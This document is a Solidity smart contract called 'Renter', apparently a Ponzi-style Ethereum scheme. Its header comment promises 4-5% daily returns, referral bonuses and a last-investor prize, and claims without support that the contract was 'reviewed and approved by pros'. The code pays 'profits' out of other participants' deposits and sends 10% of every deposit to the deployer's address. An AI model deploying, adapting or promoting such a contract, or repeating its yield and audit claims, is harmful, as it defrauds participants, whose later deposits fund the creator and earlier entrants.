['pragma solidity ^0.4.25;\n', '\n', '/**\n', ' *\n', ' * Renter Contract\n', ' *  - GAIN 4-5% PER 24 HOURS (every 5900 blocks)\n', ' *  - 10% of the contributions go to project advertising\n', ' *\n', ' * How to use:\n', ' *  1. Send 0.01, 0.1 or 1 Ether to make an investment.\n', ' *  2a. Claim your profit by sending 0 Ether transaction (every minute,\n', " *      every day, every week, i don't care unless you're spending too\n", ' *      much on GAS).\n', ' *  OR\n', ' *  2b. Send 0.01, 0.1 or 1 Ether to reinvest AND get your profit at the\n', ' *      same time.\n', ' *  3. Participants with referrers receive 5% instead of 4%.\n', " *  4. To become someone's referral, enter the address of the referrer\n", ' *     in the field DATA when sending the first deposit.\n', ' *  5. Only a participant who deposited at least 0.01 Ether can become a\n', ' *     referrer.\n', ' *  6. Referrers receive 10% of each deposit of referrals immediately to\n', ' *     their wallet.\n', ' *  7. To receive the prize fund, you need to be the last investor for at\n', ' *     least 42 blocks (~10 minutes), after which you need to send 0 Ether\n', ' *     or reinvest.\n', ' *\n', ' * RECOMMENDED GAS LIMIT: 200000\n', ' * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', ' *\n', ' * Contract reviewed and approved by pros!\n', ' *\n', ' */\n', ' \n', 'contract Renter {\n', '    address support = msg.sender;\n', '    uint public prizeFund;\n', '    address public lastInvestor;\n', '    uint public lastInvestedAt;\n', '    \n', '    uint public totalInvestors;\n', '    uint public totalInvested;\n', '    \n', '    // records amounts invested\n', '    mapping (address => uint) public invested;\n', '    // records blocks at which investments were made\n', '    mapping (address => uint) public atBlock;\n', '    // records referrers\n', '    mapping (address => address) public referrers;\n', '    \n', '    function bytesToAddress(bytes source) internal pure returns (address parsedAddress) {\n', '        assembly {\n', '            parsedAddress := mload(add(source,0x14))\n', '        }\n', '        return parsedAddress;\n', '    }\n', '\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function () external payable {\n', '        require(msg.value == 0 || msg.value == 0.01 ether\n', '            || msg.value == 0.1 ether || msg.value == 1 ether);\n', '        \n', '        prizeFund += msg.value * 7 / 100;\n', '        uint transferAmount;\n', '        \n', '        support.transfer(msg.value / 10);\n', '        \n', '        // if sender (aka YOU) is invested more than 0 ether\n', '        if (invested[msg.sender] != 0) {\n', '            uint max = (address(this).balance - prizeFund) * 9 / 10;\n', '            \n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * (4 - 5)% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint percentage = referrers[msg.sender] == 0x0 ? 4 : 5;\n', '            uint amount = invested[msg.sender] * percentage / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '            if (amount > max) {\n', '                amount = max;\n', '            }\n', '\n', '            transferAmount += amount;\n', '        } else {\n', '            totalInvestors++;\n', '        }\n', '        \n', '        if (lastInvestor == msg.sender && block.number >= lastInvestedAt + 42) {\n', '            transferAmount += prizeFund;\n', '            prizeFund = 0;\n', '        }\n', '        \n', '        if (msg.value > 0) {\n', '            if (invested[msg.sender] == 0 && msg.data.length == 20) {\n', '                address referrerAddress = bytesToAddress(bytes(msg.data));\n', '                require(referrerAddress != msg.sender);     \n', '                if (invested[referrerAddress] > 0) {\n', '                    referrers[msg.sender] = referrerAddress;\n', '                }\n', '            }\n', '            \n', '            if (referrers[msg.sender] != 0x0) {\n', '                referrers[msg.sender].transfer(msg.value / 10);\n', '            }\n', '            \n', '            lastInvestor = msg.sender;\n', '            lastInvestedAt = block.number;\n', '        }\n', '\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '        totalInvested += msg.value;\n', '        \n', '        if (transferAmount > 0) {\n', '            msg.sender.transfer(transferAmount);\n', '        }\n', '    }\n', '}']